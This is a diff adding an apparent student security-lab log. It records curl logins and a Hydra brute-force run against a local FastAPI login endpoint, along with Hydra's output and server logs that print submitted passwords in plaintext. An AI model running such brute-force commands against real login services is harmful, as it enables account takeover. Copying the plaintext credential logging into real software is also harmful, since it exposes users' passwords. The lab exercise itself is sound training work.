@@ -1,0 +1,156 @@
+──(kali㉿kali)-[~/information-security/lab-12]
+└─$ curl -X POST http://localhost:8000/login \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=test&password=wrong"
+{"status":"error","message":"Invalid credentials"}                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/information-security/lab-12]
+└─$ curl -X POST http://localhost:8000/login \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=admin&password=12345admin"
+{"status":"success","token":"secret_token_12345","message":"Authentication successful"}                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/information-security/lab-12]
+└─$ hydra -f -I -V -L usernames.txt -P passwords.txt -s 8000 localhost http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-03 08:03:06
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 100 login tries (l:10/p:10), ~7 tries per task
+[DATA] attacking http-post-form://localhost:8000/login:username=^USER^&password=^PASS^:F=Invalid
+[ATTEMPT] target localhost - login "admin" - pass "12345" - 1 of 100 [child 0] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "password" - 2 of 100 [child 1] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "admin" - 3 of 100 [child 2] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "123456" - 4 of 100 [child 3] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "qwerty" - 5 of 100 [child 4] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "12345admin" - 6 of 100 [child 5] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "admin123" - 7 of 100 [child 6] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "root" - 8 of 100 [child 7] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "letmein" - 9 of 100 [child 8] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "welcome" - 10 of 100 [child 9] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "12345" - 11 of 100 [child 10] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "password" - 12 of 100 [child 11] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "admin" - 13 of 100 [child 12] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "123456" - 14 of 100 [child 13] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "qwerty" - 15 of 100 [child 14] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "12345admin" - 16 of 100 [child 15] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "admin123" - 17 of 100 [child 0] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "root" - 18 of 100 [child 9] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "letmein" - 19 of 100 [child 3] (0/0)
+[8000][http-post-form] host: localhost   login: admin   password: 12345admin
+[STATUS] attack finished for localhost (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-03 08:03:07
+                                                                                                                                                                                                                                           
+
+fastapi dev main.py
+
+   FastAPI   Starting development server 🚀
+ 
+             Searching for package file structure from directories with __init__.py files
+             Importing from /home/kali/information-security/lab-12
+ 
+    module   🐍 main.py
+ 
+      code   Importing the FastAPI app object from the module with the following code:
+ 
+             from main import app
+ 
+       app   Using import string: main:app
+ 
+    server   Server started at http://127.0.0.1:8000
+    server   Documentation at http://127.0.0.1:8000/docs
+ 
+       tip   Running in development mode, for production use: fastapi run
+ 
+             Logs:
+ 
+      INFO   Will watch for changes in these directories: ['/home/kali/information-security/lab-12']
+INFO:uvicorn.error:Will watch for changes in these directories: ['/home/kali/information-security/lab-12']
+      INFO   Uvicorn running on http://127.0.0.1:8000 (Press CTRL+C to quit)
+INFO:uvicorn.error:Uvicorn running on http://127.0.0.1:8000 (Press CTRL+C to quit)
+      INFO   Started reloader process [1962] using WatchFiles
+INFO:uvicorn.error:Started reloader process [1962] using WatchFiles
+      INFO   Started server process [2036]
+INFO:uvicorn.error:Started server process [2036]
+      INFO   Waiting for application startup.
+INFO:uvicorn.error:Waiting for application startup.
+      INFO   Application startup complete.
+INFO:uvicorn.error:Application startup complete.
+INFO:watchfiles.main:1 change detected
+INFO:watchfiles.main:1 change detected
+INFO:main:Login attempt - Username: 'test', Password: 'wrong'
+INFO:main:❌ Failed login attempt for user: test
+      INFO   127.0.0.1:40610 - "POST /login HTTP/1.1" 200
+INFO:main:Login attempt - Username: 'admin', Password: '12345admin'
+INFO:main:✅ Successful login for user: admin
+      INFO   127.0.0.1:40618 - "POST /login HTTP/1.1" 200
+      INFO   127.0.0.1:46690 - "GET /login HTTP/1.0" 405
+      INFO   127.0.0.1:46698 - "GET /login HTTP/1.0" 405
+      INFO   127.0.0.1:46706 - "GET /login HTTP/1.0" 405
+      INFO   127.0.0.1:46736 - "GET /login HTTP/1.0" 405
+      INFO   127.0.0.1:46710 - "GET /login HTTP/1.0" 405
+      INFO   127.0.0.1:46746 - "GET /login HTTP/1.0" 405
+      INFO   127.0.0.1:46722 - "GET /login HTTP/1.0" 405
+      INFO   127.0.0.1:46724 - "GET /login HTTP/1.0" 405
+      INFO   127.0.0.1:46748 - "GET /login HTTP/1.0" 405
+      INFO   127.0.0.1:46754 - "GET /login HTTP/1.0" 405
+      INFO   127.0.0.1:46770 - "GET /login HTTP/1.0" 405
+      INFO   127.0.0.1:46794 - "GET /login HTTP/1.0" 405
+      INFO   127.0.0.1:46786 - "GET /login HTTP/1.0" 405
+      INFO   127.0.0.1:46810 - "GET /login HTTP/1.0" 405
+      INFO   127.0.0.1:46796 - "GET /login HTTP/1.0" 405
+      INFO   127.0.0.1:46814 - "GET /login HTTP/1.0" 405
+INFO:main:Login attempt - Username: 'admin', Password: '12345'
+INFO:main:❌ Failed login attempt for user: admin
+      INFO   127.0.0.1:46820 - "POST /login HTTP/1.0" 200
+INFO:main:Login attempt - Username: 'admin', Password: '123456'
+INFO:main:❌ Failed login attempt for user: admin
+INFO:main:Login attempt - Username: 'admin', Password: 'welcome'
+INFO:main:❌ Failed login attempt for user: admin
+      INFO   127.0.0.1:46824 - "POST /login HTTP/1.0" 200
+INFO:main:Login attempt - Username: 'admin', Password: '12345admin'
+INFO:main:✅ Successful login for user: admin
+      INFO   127.0.0.1:46848 - "POST /login HTTP/1.0" 200
+      INFO   127.0.0.1:46834 - "POST /login HTTP/1.0" 200
+INFO:main:Login attempt - Username: 'admin', Password: 'qwerty'
+INFO:main:❌ Failed login attempt for user: admin
+      INFO   127.0.0.1:46858 - "POST /login HTTP/1.0" 200
+INFO:main:Login attempt - Username: 'root', Password: '12345'
+INFO:main:❌ Failed login attempt for user: root
+INFO:main:Login attempt - Username: 'admin', Password: 'letmein'
+INFO:main:❌ Failed login attempt for user: admin
+      INFO   127.0.0.1:46878 - "POST /login HTTP/1.0" 200
+INFO:main:Login attempt - Username: 'root', Password: 'password'
+INFO:main:❌ Failed login attempt for user: root
+      INFO   127.0.0.1:46856 - "POST /login HTTP/1.0" 200
+INFO:main:Login attempt - Username: 'root', Password: 'admin'
+INFO:main:❌ Failed login attempt for user: root
+      INFO   127.0.0.1:46890 - "POST /login HTTP/1.0" 200
+INFO:main:Login attempt - Username: 'admin', Password: 'password'
+INFO:main:❌ Failed login attempt for user: admin
+INFO:main:Login attempt - Username: 'admin', Password: 'admin123'
+INFO:main:❌ Failed login attempt for user: admin
+INFO:main:Login attempt - Username: 'admin', Password: 'admin'
+INFO:main:❌ Failed login attempt for user: admin
+      INFO   127.0.0.1:46900 - "POST /login HTTP/1.0" 200
+      INFO   127.0.0.1:46906 - "POST /login HTTP/1.0" 200
+      INFO   127.0.0.1:46922 - "POST /login HTTP/1.0" 200
+INFO:main:Login attempt - Username: 'admin', Password: 'root'
+INFO:main:❌ Failed login attempt for user: admin
+      INFO   127.0.0.1:46934 - "POST /login HTTP/1.0" 200
+INFO:main:Login attempt - Username: 'root', Password: 'qwerty'
+INFO:main:❌ Failed login attempt for user: root
+INFO:main:Login attempt - Username: 'root', Password: '12345admin'
+INFO:main:❌ Failed login attempt for user: root
+      INFO   127.0.0.1:46940 - "POST /login HTTP/1.0" 200
+      INFO   127.0.0.1:46956 - "POST /login HTTP/1.0" 200
+INFO:main:Login attempt - Username: 'root', Password: '123456'
+      INFO   127.0.0.1:46972 - "POST /login HTTP/1.0" 200
+INFO:main:❌ Failed login attempt for user: root
+      INFO   127.0.0.1:46976 - "POST /login HTTP/1.0" 200
+      INFO   127.0.0.1:46992 - "GET /login HTTP/1.0" 405
+      INFO   127.0.0.1:47004 - "GET /login HTTP/1.0" 405
+      INFO   127.0.0.1:47016 - "GET /login HTTP/1.0" 405
+
+
+
+
+
